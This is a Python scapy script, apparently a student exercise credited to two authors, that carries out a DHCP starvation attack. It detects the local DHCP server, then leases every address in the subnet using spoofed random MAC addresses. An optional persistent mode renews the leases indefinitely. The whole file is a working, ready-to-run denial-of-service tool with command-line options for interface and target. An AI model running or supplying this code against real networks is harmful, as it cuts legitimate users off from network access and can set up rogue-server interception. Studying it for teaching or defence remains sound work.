# By: Uriel Dolev 215676560 & Yahel Koler 2147377728
from scapy.all import *
import ipaddress
from random import randint
from time import sleep


def generate_headers(spoofed_mac):
    src_mac = spoofed_mac
    dst_mac = "ff:ff:ff:ff:ff:ff"
    ether = Ether(src=src_mac, dst=dst_mac)
    src_ip = "0.0.0.0"
    dst_ip = "255.255.255.255"
    ip = IP(src=src_ip, dst=dst_ip)
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(op = 1, chaddr=str(src_mac), xid=randint(0x10000000, 0x99999999))
    packet = ether/ip/udp/bootp
    return(packet)

def detect_dhcp_server_info(iface):
    sendp(generate_headers(get_if_hwaddr(iface))/DHCP(options=[("message-type", "discover"), "end"]), iface=iface)
    offer = sniff(iface=iface, filter = 'src port 67', count=1)

    dhcp_options = dict([option for option in offer[0][DHCP].options if isinstance(option,tuple)])
    
    return dhcp_options["server_id"], dhcp_options["subnet_mask"], dhcp_options["lease_time"]


def attack(ip_to_mac, server_ip, iface, renew=False):
    obtained_ips = {}

    for ip, mac in ip_to_mac.items():
        headers = generate_headers(mac)
        if not renew:
            dhcp_discover = DHCP(options=[("message-type", "discover"), ("server_id", server_ip), "end"])
            sendp(headers / dhcp_discover, iface=iface)

            packet = sniff(iface=iface, timeout=3, filter="udp and src port 67", count =1)
            if not len(packet):
                break
            ip = packet[0][BOOTP].yiaddr
            obtained_ips[ip] = mac2str(mac)
        dhcp_request = DHCP(options=[("message-type", "request"), ("requested_addr", ip), ("server_id", server_ip), "end"])
        sendp(headers / dhcp_request, iface=iface)
    
    print("obtained ips: ",list(obtained_ips.keys()))
    return obtained_ips
    

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(usage="DHCPStarvationNEW.py [-h] [-i IFACE] [-t TARGET]", description="DHCP Starvation")
    parser.add_argument('-p', '--persistent', dest = 'PERSISTENT', default=False, action='store_true', help='persistent?')
    parser.add_argument('-i', '--interface', dest = 'IFACE', help = 'Interface you wish to use', default=conf.iface)
    parser.add_argument('-t', '--target', dest = 'IP', help = 'IP of target server')

    command_args = parser.parse_args()

    target_ip, net_mask, lease_time = detect_dhcp_server_info(command_args.IFACE)
    target_ip = target_ip if command_args.IP is None else command_args.IP
    target_network = ipaddress.IPv4Interface(target_ip+'/'+net_mask)
    ip_to_spoofed_mac_addresses = {str(ip):RandMAC() for ip in target_network.network}
    ip_mac_recieved = attack(ip_to_spoofed_mac_addresses, target_ip, command_args.IFACE)
    print('attack finished')
    print(lease_time)

    if command_args.PERSISTENT:
        while True:
            sleep(lease_time/2)
            ip_to_spoofed_mac_addresses = {str(ip):RandMAC() for ip in target_network.network}
            attack(ip_to_spoofed_mac_addresses, target_ip, command_args.IFACE)
            print('renewal finished')